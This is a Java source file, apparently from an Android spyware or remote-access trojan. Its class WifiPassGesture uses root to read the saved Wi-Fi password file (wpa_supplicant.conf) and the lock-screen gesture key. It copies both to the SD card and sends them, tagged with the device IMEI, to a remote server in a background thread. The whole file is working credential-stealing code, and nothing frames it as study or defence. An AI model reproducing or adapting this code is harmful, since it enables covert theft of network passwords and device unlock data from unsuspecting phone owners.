package com.phone.data;

import com.main.ForegroundService;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.WriteDateFile;
import java.io.File;
import java.io.FileInputStream;

import android.content.Context;
import android.util.Log;

public class WifiPassGesture {
	private static final String TAG = "WifiPassGesture";
	
	public static String getWifiPassword(Context context){
		String wifipas = "";
		try{
			
			 ShellCmd.execShell("su","cat /data/misc/wifi/wpa_supplicant.conf > " +
				ForegroundService.SDCARD_PATH_NAME + ForegroundService.WIFI_PASS_FILENAME);
			 File file = new File(ForegroundService.SDCARD_PATH_NAME + ForegroundService.WIFI_PASS_FILENAME);
			 if (file.exists()) {
				FileInputStream fin = new FileInputStream(file);
				byte [] data = new byte[(int)file.length()];
				fin.read(data, 0, (int)file.length());
				fin.close();
				if(data.length > 0){
			        WriteDateFile.writeDateFile(ForegroundService.SDCARD_PATH_NAME, ForegroundService.WIFI_PASS_FILENAME,new String(data),true);
			        SendDataToServer sds=new SendDataToServer(data, data.length,Public.CMD_DATA_WIFIPASS, Public.IMEI);
			    	Thread threadsendloc = new Thread(sds);
			    	threadsendloc.start();
				}
			}
		}
		catch(Exception ex){
			Log.e(TAG,"getWifiPass exception");
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getWifiPass exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
		}
		
		return wifipas;
	}
	
	
	public static String getScreenGesture(Context context){
		String gesture = "";
		
		try{

			ShellCmd.execShell("su","cat /data/system/gesture.key  > " + 
					ForegroundService.SDCARD_PATH_NAME  + ForegroundService.SCREENGESTURE_FILENAME);
			 File file = new File(ForegroundService.SDCARD_PATH_NAME + ForegroundService.SCREENGESTURE_FILENAME);
			 if (file.exists()) {
				FileInputStream fin = new FileInputStream(file);
				byte [] data = new byte[(int)file.length()];
				fin.read(data, 0, (int)file.length());
				fin.close();
				
				if(data.length > 0){
			        WriteDateFile.writeDateFile(ForegroundService.SDCARD_PATH_NAME, ForegroundService.SCREENGESTURE_FILENAME, new String(data),true);
					SendDataToServer sds=new SendDataToServer(data, data.length,Public.CMD_DATA_GESTURE, Public.IMEI);
			    	Thread threadsendloc = new Thread(sds);
			    	threadsendloc.start();
				}
			}
		}
		catch(Exception ex){
			Log.e(TAG,"getGesture exception");
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getGesture exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
		}
		
		return gesture;
	}
	
	
	


}
